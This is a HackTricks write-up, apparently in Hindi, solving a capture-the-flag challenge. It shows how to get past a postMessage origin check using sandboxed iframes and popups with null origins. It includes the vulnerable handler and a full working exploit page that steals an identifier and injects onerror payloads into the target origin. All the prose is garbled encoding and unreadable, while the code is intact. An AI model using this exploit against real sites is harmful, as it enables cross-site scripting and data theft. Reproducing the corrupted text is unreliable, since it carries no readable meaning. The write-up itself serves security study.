# Iframes рдХреЗ рд╕рд╛рде SOP рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдирд╛ - 1

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рдЕрдирдиреНрдп [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

## SOP-1 рдореЗрдВ Iframes

рдЗрд╕ [**рдЪреБрдиреМрддреА**](https://github.com/terjanq/same-origin-xss) рдХреЗ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ рдЬрд┐рд╕реЗ [**NDevTK**](https://github.com/NDevTK) рдФрд░ [**Terjanq**](https://github.com/terjanq) рдиреЗ рдмрдирд╛рдпрд╛ рд╣реИ, рдЖрдкрдХреЛ рдХреЛрдб рдореЗрдВ XSS рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
const data = e.data;
if (e.origin !== window.origin && data.identifier !== identifier) return;
if (data.type === 'render') {
renderContainer.innerHTML = data.body;
}
}
```
рдореБрдЦреНрдп рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ [**рдореБрдЦреНрдп рдкреГрд╖реНрда**](https://so-xss.terjanq.me) `data.body` рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП DomPurify рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЙрд╕ рдХреЛрдб рдХреЛ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ html рдбреЗрдЯрд╛ рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ `e.origin !== window.origin` рдХреЛ **рдмрд╛рдИрдкрд╛рд╕** рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдЪрд▓рд┐рдП рджреЗрдЦрддреЗ рд╣реИрдВ рд╡реЗ рдХреМрди рд╕реА рд╕рдорд╛рдзрд╛рди рд╕реБрдЭрд╛рддреЗ рд╣реИрдВред

### SOP рдмрд╛рдИрдкрд╛рд╕ 1 (e.origin === null)

рдЬрдм `//example.org` рдХреЛ рдПрдХ **sandboxed iframe** рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдкреГрд╖реНрда рдХрд╛ **рдореВрд▓** **`null`** рд╣реЛрдЧрд╛, рдЕрд░реНрдерд╛рдд **`window.origin === null`** рд╣реЛрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ iframe рдХреЛ рдПрдореНрдмреЗрдб рдХрд░рдХреЗ рд╣рдо **`null` рдореВрд▓** рдХреЛ **рдмрд╛рдзреНрдп** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдкреГрд╖реНрда **рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛** рдерд╛ рддреЛ рдЖрдк рдЙрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рдереЗ (рдХреБрдХреАрдЬрд╝ рдХреЛ `SameSite=None` рдкрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ)ред

### SOP рдмрд╛рдИрдкрд╛рд╕ 2 (window.origin === null)

рдХрдо рдЬрд╛рдиреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рддрдереНрдп рдпрд╣ рд╣реИ рдХрд┐ рдЬрдм **sandbox рдорд╛рди `allow-popups` рд╕реЗрдЯ рд╣реЛрддрд╛ рд╣реИ** рддреЛ **рдЦреЛрд▓реЗ рдЧрдП рдкреЙрдкрдЕрдк** рдХреЛ **рд╕рднреА рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ рдЕрдиреБрд░реЛрдзрд┐рдд** рдХрд░реЗрдВрдЧреА рдЬрдм рддрдХ `allow-popups-to-escape-sandbox` рд╕реЗрдЯ рди рд╣реЛред\
рдЗрд╕рд▓рд┐рдП, рдПрдХ **null рдореВрд▓** рд╕реЗ **рдкреЙрдкрдЕрдк** рдЦреЛрд▓рдиреЗ рд╕реЗ рдкреЙрдкрдЕрдк рдХреЗ рдЕрдВрджрд░ рдХрд╛ **`window.origin`** рднреА **`null`** рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

### рдЪреБрдиреМрддреА рдХрд╛ рд╕рдорд╛рдзрд╛рди

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдЪреБрдиреМрддреА рдХреЗ рд▓рд┐рдП, рдХреЛрдИ рднреА рдПрдХ **iframe** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, **рдкреЙрдкрдЕрдк** рдЦреЛрд▓ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╡рд┐рдХрд▓реНрдкреА XSS рдХреЛрдб рд╣реИрдВрдбрд▓рд░ (`/iframe.php`) рдХреЗ рдкреГрд╖реНрда рдкрд░, `window.origin === e.origin` рдХреНрдпреЛрдВрдХрд┐ рджреЛрдиреЛрдВ `null` рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП XSS рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ payload рднреЗрдЬрдирд╛ рд╕рдВрднрд╡ рд╣реИред

рд╡рд╣ **payload** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рдФрд░ рдПрдХ **XSS** рдХреЛ рд╢реАрд░реНрд╖ рдкреГрд╖реНрда (рдкреЙрдкрдЕрдк рдЦреЛрд▓рдиреЗ рд╡рд╛рд▓рд╛ рдкреГрд╖реНрда) рдХреЛ **рд╡рд╛рдкрд╕ рднреЗрдЬреЗрдЧрд╛**, рдЬреЛ **рд╡рд┐рдХрд▓реНрдкреА** `/iframe.php` рдореЗрдВ **рд╕реНрдерд╛рди рдмрджрд▓реЗрдЧрд╛**ред рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдорд╛рдпрдиреЗ рдирд╣реАрдВ рд░рдЦрддрд╛ рд╣реИ рдХрд┐ рд╢рд░реНрдд `window.origin === e.origin` рдкреВрд░реА рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ (рдпрд╛рдж рд░рдЦреЗрдВ, рдореВрд▓ рд╣реИ **iframe** рдХрд╛ рдкреЙрдкрдЕрдк рдЬрд┐рд╕рдХрд╛ **рдореВрд▓** **`null`** рд╣реИ) рдХреНрдпреЛрдВрдХрд┐ `data.identifier === identifier` рд╣реЛрддрд╛ рд╣реИред рдлрд┐рд░, **XSS рдлрд┐рд░ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛**, рдЗрд╕ рдмрд╛рд░ рд╕рд╣реА рдореВрд▓ рдореЗрдВред
```html
<body>
<script>
f = document.createElement('iframe');

// Needed flags
f.sandbox = 'allow-scripts allow-popups allow-top-navigation';

// Second communication with /iframe.php (this is the top page relocated)
// This will execute the alert in the correct origin
const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
},1000);`.replaceAll('\n',' ');

// Initial communication
// Open /iframe.php in a popup, both iframes and popup will have "null" as origin
// Then, bypass window.origin === e.origin to steal the identifier and communicate
// with the top with the second XSS payload
f.srcdoc = `
<h1>Click me!</h1>
<script>
onclick = e => {
let w = open('https://so-xss.terjanq.me/iframe.php');
onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
setTimeout(_ => {
w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
}, 1000);
};
<\/script>
`
document.body.appendChild(f);
</script>
</body>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред**

</details>
